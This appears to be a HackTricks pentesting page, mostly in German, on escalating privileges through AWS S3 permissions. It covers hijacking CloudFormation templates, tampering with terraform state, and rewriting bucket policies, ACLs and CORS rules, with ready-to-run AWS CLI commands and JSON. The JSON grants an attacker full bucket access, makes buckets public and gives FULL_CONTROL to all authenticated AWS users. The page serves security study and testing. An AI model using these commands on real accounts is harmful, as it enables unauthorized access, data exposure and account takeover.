# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Ein Angreifer mit diesen Berechtigungen für interessante Buckets könnte Ressourcen hijacken und Privilegien eskalieren.

Zum Beispiel kann ein Angreifer mit diesen **Berechtigungen für einen cloudformation bucket** namens "cf-templates-nohnwfax6a6i-us-east-1" die Deployment hijacken. Der Zugriff kann mit der folgenden Policy gewährt werden:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
Und das Hijack ist möglich, weil es ein **kleines Zeitfenster von dem Moment, in dem das Template in den bucket hochgeladen wird, bis zu dem Moment, in dem das Template bereitgestellt wird** gibt. Ein Angreifer könnte einfach eine **lambda function** in seinem Account erstellen, die **ausgelöst wird, wenn eine bucket-Benachrichtigung gesendet wird**, und den **Inhalt** dieses **bucket** hijackt.

![](<../../../images/image (174).png>)

Das Pacu-Modul [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) kann verwendet werden, um diesen Angriff zu automatisieren.\
Für mehr Informationen siehe die Originalforschung: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Dies sind die Berechtigungen, um **get and upload objects to S3**. Mehrere Services innerhalb von AWS (und außerhalb) verwenden S3-Storage, um **config files** zu speichern.\
Ein Angreifer mit **read access** auf diese Dateien könnte dort **sensitive information** finden.\
Ein Angreifer mit **write access** darauf könnte **modify the data to abuse some service and try to escalate privileges**.\
Das sind einige Beispiele:

- Wenn eine EC2-Instanz die **user data in a S3 bucket** speichert, könnte ein Angreifer diese verändern, um **execute arbitrary code inside the EC2 instance**.

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

Es ist sehr üblich, dass die [terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) state files in Blob-Storage von Cloud-Anbietern, z. B. AWS S3, gespeichert werden. Die Dateiendung für eine State-Datei ist `.tfstate`, und die Bucket-Namen verraten oft, dass sie terraform state files enthalten. Normalerweise hat jedes AWS-Konto einen solchen bucket, um die state files zu speichern, die den Zustand des Kontos zeigen.  
Auch in realen Accounts haben meistens alle Entwickler `s3:*` und manchmal sogar Business-User `s3:Put*`.

Wenn du also die oben genannten Berechtigungen auf diese Dateien hast, gibt es einen Angriffsvektor, der es dir erlaubt, RCE in der Pipeline mit den Rechten von `terraform` zu erlangen — meistens `AdministratorAccess`, womit du zum Admin des Cloud-Accounts wirst. Außerdem kannst du diesen Vektor nutzen, um einen Denial-of-Service-Angriff durchzuführen, indem du `terraform` dazu bringst, legitime Ressourcen zu löschen.

Folge der Beschreibung im Abschnitt *Abusing Terraform State Files* der Seite *Terraform Security* für direkt verwendbaren Exploit-Code:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

Ein Angreifer, der **aus demselben account** sein muss — andernfalls tritt die Fehlermeldung `The specified method is not allowed will trigger` auf — kann sich mit dieser Berechtigung mehr Rechte für den/die bucket(s) gewähren, sodass er Buckets lesen, schreiben, verändern, löschen und exponieren kann.
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Ein Angreifer könnte diese Berechtigungen missbrauchen, um sich **weiteren Zugriff** auf bestimmte Buckets zu gewähren.\
Beachte, dass der Angreifer nicht aus demselben Account stammen muss. Außerdem ermöglicht der Schreibzugriff
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Ein Angreifer könnte diese Berechtigungen missbrauchen, um sich mehr Zugriff auf bestimmte Objekte in Buckets zu verschaffen.
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Ein Angreifer mit diesen Berechtigungen sollte in der Lage sein, einer bestimmten Objektversion eine Acl zuzuweisen.
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
### `s3:PutBucketCORS`

Ein Angreifer mit der s3:PutBucketCORS-Berechtigung kann die CORS (Cross-Origin Resource Sharing)-Konfiguration eines Buckets ändern, die steuert, welche Webdomains auf dessen Endpunkte zugreifen dürfen. Wenn er eine zu großzügige Richtlinie setzt, könnte jede Website direkte Anfragen an den Bucket stellen und Antworten im Browser auslesen.

Das bedeutet, dass potenziell — wenn ein authentifizierter Benutzer einer von dem Bucket gehosteten Webanwendung die Website des Angreifers besucht — der Angreifer die großzügige CORS-Richtlinie ausnutzen und je nach Anwendung auf Profildaten des Benutzers zugreifen oder sogar das Benutzerkonto kapern könnte.
```bash
aws s3api put-bucket-cors \
--bucket <BUCKET_NAME> \
--cors-configuration '{
"CORSRules": [
{
"AllowedOrigins": ["*"],
"AllowedMethods": ["GET", "PUT", "POST"],
"AllowedHeaders": ["*"],
"ExposeHeaders": ["x-amz-request-id"],
"MaxAgeSeconds": 3000
}
]
}'
```
{{#include ../../../../banners/hacktricks-training.md}}
